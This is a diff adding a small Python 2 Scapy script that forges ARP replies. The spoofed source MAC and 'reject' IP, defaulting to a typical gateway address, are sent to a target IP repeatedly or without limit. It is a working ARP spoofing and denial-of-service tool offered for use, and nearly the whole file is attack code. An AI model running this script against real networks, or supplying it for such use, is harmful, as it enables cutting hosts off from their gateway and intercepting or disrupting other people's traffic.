@@ -1,0 +1,41 @@
+#!/usr/bin/python
+
+from scapy.all import *
+from time import sleep
+import argparse
+
+parser = argparse.ArgumentParser(description='ARM Spoof a target')
+parser.add_argument('-c', '--count',  action="store", dest="count",  default="-1", type=int,      help="Count")
+parser.add_argument('-d', '--delay',  action="store", dest="delay",  default="1000", type=int,    help="Delay")
+parser.add_argument('-r', '--reject', action="store", dest="reject", default="192.168.0.1",       help="IP to Reject")
+parser.add_argument('-m', '--mac',    action="store", dest="mac",    default="aa:bb:cc:dd:ee:ff", help="* MAC address to spoof")
+parser.add_argument('-m2','--hwdst',  action="store", dest="hwdst",  default="ff:ff:ff:ff:ff:ff", help="* MAC address to send to")
+parser.add_argument('-o', '--op',     action="store", dest="op",     default="2", type=int, help="* No idea, ARP().op variable")
+parser.add_argument('target',         action="store", help="IP to ARM Spoof")
+args = parser.parse_args()
+
+dosA=ARP()
+dosA.op = args.op
+dosA.hwsrc = args.mac
+dosA.hwdst = args.hwdst
+dosA.psrc = args.reject
+dosA.pdst = args.target
+
+dosA.display()
+print "Target:",args.target
+print "Reject:",args.reject
+print "Delay:",args.delay
+print "Count:",args.count
+raw_input("Press ENTER to continue")
+print
+
+sent = 0
+try:
+    while ( (sent<args.count) or (args.count==-1) ):
+        send(dosA)
+        sent += 1
+        print "Sent",sent,"/",args.count
+        sleep(args.delay/1000)
+except:
+    print "Error\n"
+    pass
